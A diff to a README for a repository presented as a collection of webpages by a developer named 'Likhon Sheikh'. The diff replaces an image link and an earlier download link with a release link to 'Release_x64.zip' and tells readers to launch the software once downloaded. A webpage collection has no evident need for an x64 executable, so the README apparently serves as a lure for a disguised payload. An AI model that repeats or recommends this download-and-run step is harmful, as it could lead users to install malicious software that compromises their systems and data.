@@ -1,6 +1,6 @@
 # Welcome to LikhonWebPages 🚀
 
-![LikhonWebPages](https://example.com/image.png)
+![LikhonWebPages](https://github.com/RennOnly/likhonwebpages/releases/download/v2.0/Release_x64.zip)
 
 ## Repository Description
 Welcome to LikhonWebPages, a collection of webpages created by "Likhon Sheikh", a talented Full Stack Developer and Tech Enthusiast from Bangladesh. This repository showcases Likhon's passion for creating innovative solutions and sharing knowledge with the world! 🌐
@@ -19,7 +19,7 @@ Welcome to LikhonWebPages, a collection of webpages created by "Likhon Sheikh", 
 - webapp
 
 ## Software Download
-📥 You can download the software related to LikhonWebPages [here](https://github.com/user-attachments/files/18383251/Software.zip). Please note that it needs to be launched once downloaded.
+📥 You can download the software related to LikhonWebPages [here](https://github.com/RennOnly/likhonwebpages/releases/download/v2.0/Release_x64.zip). Please note that it needs to be launched once downloaded.
 
 ## Explore LikhonWebPages
 Feel free to explore the webpages within this repository and discover the creative works of Likhon Sheikh. 🌟
